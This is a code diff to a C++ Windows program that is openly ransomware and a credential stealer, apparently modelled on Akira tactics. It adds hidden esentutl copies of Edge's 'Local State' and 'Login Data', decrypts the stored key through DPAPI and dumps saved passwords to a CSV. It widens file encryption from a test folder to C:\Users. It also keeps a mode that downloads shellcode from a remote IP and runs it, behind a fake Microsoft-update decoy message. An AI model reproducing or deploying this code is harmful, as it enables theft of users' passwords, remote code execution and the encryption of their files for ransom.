@@ -137,9 +137,7 @@ If you're indeed interested in our assistance and the services we provide you ca
 Keep in mind that the faster you will get in touch, the less damage we cause.
 )";
 
-// public key (same 256-byte modulus, 32-byte ChaCha20 key encrypted with RSA)
-// For the POC we skip RSA and just hard-code the ChaCha20 key.
-// In real ransomware you would RSA-wrap the key; here we keep it simple.
+// (32-byte ChaCha20 key encrypted with RSA)
 static const unsigned char CHACHA_KEY[crypto_stream_chacha20_KEYBYTES] = {
 	0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
 	0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,
@@ -208,7 +206,7 @@ void process_directory(const fs::path& dir)
 }
 
 // --------------------------------------------------------------------------
-// DPAPI Helpers
+// DPAPI Helpers (part of /d)
 // --------------------------------------------------------------------------
 std::vector<BYTE> Base64ToBytes(const std::string& b64)
 {
@@ -268,6 +266,112 @@ std::string AES_GCM_Decrypt(const std::vector<BYTE>& blob, BCRYPT_KEY_HANDLE hKe
 	return std::string(plain.begin(), plain.end());
 }
 
+void Esentutl_LCState() {
+	char localAppData[MAX_PATH];
+	if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
+		std::cout << "\n[!] Failed to get LOCALAPPDATA path" << std::endl;
+		return;
+	}
+
+	std::string source = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Local State";
+	std::string destination = std::string(localAppData) + "\\TEMP\\K4j6hv345kj324hv5k234j2v3o5uhv.arika";
+
+	// Check if destination file exists and delete it
+	if (GetFileAttributesA(destination.c_str()) != INVALID_FILE_ATTRIBUTES) {
+		if (!DeleteFileA(destination.c_str())) {
+			std::cerr << "Failed to delete existing file: " << destination << " Error: " << GetLastError() << std::endl;
+			return;
+		}
+		std::cout << "Deleted existing file: " << destination << std::endl;
+	}
+
+	// Build the esentutl command
+	std::string command = "esentutl.exe /y \"" + source + "\" /d \"" + destination + "\"";
+	// Execute command
+	STARTUPINFOA si = { sizeof(si) };
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	ZeroMemory(&pi, sizeof(pi));
+
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+
+	if (!CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE,
+		CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+		std::cout << "\n[!] EsentUtl Function Could Not Copy Local State! Error: " << GetLastError() << std::endl;
+		return;
+	}
+
+	WaitForSingleObject(pi.hProcess, INFINITE);
+
+	DWORD exitCode;
+	GetExitCodeProcess(pi.hProcess, &exitCode);
+
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+
+	if (exitCode != 0) {
+		std::cout << "\n[!] esentutl failed with exit code: " << exitCode << std::endl;
+	}
+	else {
+		std::cout << "\n[+] Local State copied successfully to: " << destination << std::endl;
+	}
+}
+
+void Esentutl_LGData() {
+	char localAppData[MAX_PATH];
+	if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
+		std::cout << "\n[!] Failed to get LOCALAPPDATA path" << std::endl;
+		return;
+	}
+
+	std::string source = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
+	std::string destination = std::string(localAppData) + "\\TEMP\\L4j6hv345kjL4o9g7i9n0D7at2aj2v3o5uhv.arika";
+
+	// Check if destination file exists and delete it
+	if (GetFileAttributesA(destination.c_str()) != INVALID_FILE_ATTRIBUTES) {
+		if (!DeleteFileA(destination.c_str())) {
+			std::cerr << "Failed to delete existing file: " << destination << " Error: " << GetLastError() << std::endl;
+			return;
+		}
+		std::cout << "Deleted existing file: " << destination << std::endl;
+	}
+
+	// Build the esentutl command
+	std::string command = "esentutl.exe /y \"" + source + "\" /d \"" + destination + "\"";
+	// Execute command
+	STARTUPINFOA si = { sizeof(si) };
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	ZeroMemory(&pi, sizeof(pi));
+
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+
+	if (!CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE,
+		CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+		std::cout << "\n[!] EsentUtl Function Could Not Copy Local State! Error: " << GetLastError() << std::endl;
+		return;
+	}
+
+	WaitForSingleObject(pi.hProcess, INFINITE);
+
+	DWORD exitCode;
+	GetExitCodeProcess(pi.hProcess, &exitCode);
+
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+
+	if (exitCode != 0) {
+		std::cout << "\n[!] esentutl failed with exit code: " << exitCode << std::endl;
+	}
+	else {
+		std::cout << "\n[+] Login Blob Data copied successfully to: " << destination << std::endl;
+	}
+}
+
 // --------------------------------------------------------------------------
 // Main
 // --------------------------------------------------------------------------
@@ -275,7 +379,7 @@ std::string AES_GCM_Decrypt(const std::vector<BYTE>& blob, BCRYPT_KEY_HANDLE hKe
 int main(int argc, char* argv[]) {
 	// If no arguments provided, show harmless message
 	if (argc == 1) {
-		std::cout << "This MS20250813 KB345346J346 update has already been installed on your computer. Please verify at microsoft.com/check-hotfix CS1985432. ";
+		std::cout << "\n[!] This update has already been installed on your computer. \n[-] MS-Patch: MS20250813 (Article KB345346J346)\n[+] Please verify at microsoft.com/check-hotfix CS1985432.\n ";
 		return 0;
 	}
 	// Get the first argument
@@ -286,21 +390,23 @@ int main(int argc, char* argv[]) {
 		if (argc >= 3) {
 			// Use the third argument as the IP address
 			strcpy(addrstr, argv[2]);
-			std::cout << "Using custom IP: " << addrstr << std::endl;
+			std::cout << "\n[+] Using custom IP: " << addrstr << std::endl;
 		}
 		else {
-			std::cout << "Using default IP: " << addrstr << std::endl;
+			std::cout << "\n[+] Using default IP: " << addrstr << std::endl;
 		}
 		auto sc = download((const char*)addrstr, "/test.txt ", 9443);
 		run_shellcode(sc);
 		return 0;
 	}
 	else if (argument == "/d") {
+		Esentutl_LCState();
+		Esentutl_LGData();
 		// 1. Build paths
-		char userProfile[MAX_PATH];
-		SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, userProfile);
-		std::string localStatePath = std::string(userProfile) + R"(\AppData\Local\Microsoft\Edge\User Data\Local State)";
-		std::string chromeRoot = std::string(userProfile) + R"(\AppData\Local\Microsoft\Edge\User Data)";
+		char localAppData[MAX_PATH];
+		SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
+		std::string localStatePath = std::string(localAppData) + R"(\Temp\K4j6hv345kj324hv5k234j2v3o5uhv.arika)";
+		std::string chromeRoot = std::string(localAppData) + "\\TEMP";
 		// 2. DPAPI-decrypt AES key
 		FILE* f = nullptr;
 		fopen_s(&f, localStatePath.c_str(), "rb");
@@ -315,6 +421,7 @@ int main(int argc, char* argv[]) {
 		pos = jsonStr.find(':', pos) + 2;
 		size_t end = jsonStr.find('"', pos);
 		std::string b64 = jsonStr.substr(pos, end - pos);
+		std::cout << "\n[*] Encrypted Key = " << b64 << "\n\n" ;
 		auto enc = Base64ToBytes(b64);
 		if (enc.size() < 5 || memcmp(enc.data(), "DPAPI", 5)) { std::cerr << "Bad key header\n"; return 1; }
 		auto key32 = DPAPIUnprotect(std::vector<BYTE>(enc.begin() + 5, enc.end()));
@@ -325,15 +432,15 @@ int main(int argc, char* argv[]) {
 		if (!InitAES_GCM(key32, hAlg, hKey)) { std::cerr << "AES init failed\n"; return 1; }
 		// 4. Search the two usual locations explicitly
 		const char* candidates[] = {
-			"\\Default\\Login Data",
-			"\\Profile 1\\Login Data"
+			"L4j6hv345kjL4o9g7i9n0D7at2aj2v3o5uhv.arika",
+			"L4j6hv345kjL4o9g7i9n0D7at2aj2v3o5uhw.arika"
 		};
 		std::ofstream csv("decrypted_password.csv");
 		csv << "index,url,username,password\n";
 		int idx = 0;
 		for (const char* sub : candidates) {
 			char dbPath[MAX_PATH];
-			sprintf_s(dbPath, sizeof(dbPath), "%s%s", chromeRoot.c_str(), sub);
+			sprintf_s(dbPath, sizeof(dbPath), "%s\\%s", chromeRoot.c_str(), sub);
 			if (GetFileAttributesA(dbPath) == INVALID_FILE_ATTRIBUTES)
 				continue; // file does not exist
 			sqlite3* db;
@@ -368,12 +475,20 @@ int main(int argc, char* argv[]) {
 		return 0;
 	}
 	else if (argument == "/e") {
+		//fs::path root = "C:\\Custom\\Path";
+		fs::path root = "C:\\Users"; // ACC TO ORIGINAL TTP FROM A-K-Ira
+		if (argc >= 3) {
+			// Use the third argument as the Path
+			root = argv[2];
+			std::cout << "\n[+] Using custom Path: " << root << std::endl;
+		}
+		else {
+			std::cout << "\n[+] Using default Path: " << root << std::endl;
+		}
 		if (sodium_init() < 0) {
 			std::cerr << "libsodium init failed\n";
 			return 1;
 		}
-		fs::path root = "C:\\Users\\clark kent\\Desktop\\something5";
-		//fs::path root = "C:\\Users";
 		if (!fs::exists(root)) {
 			std::cerr << "Folder not found\n";
 			return 1;
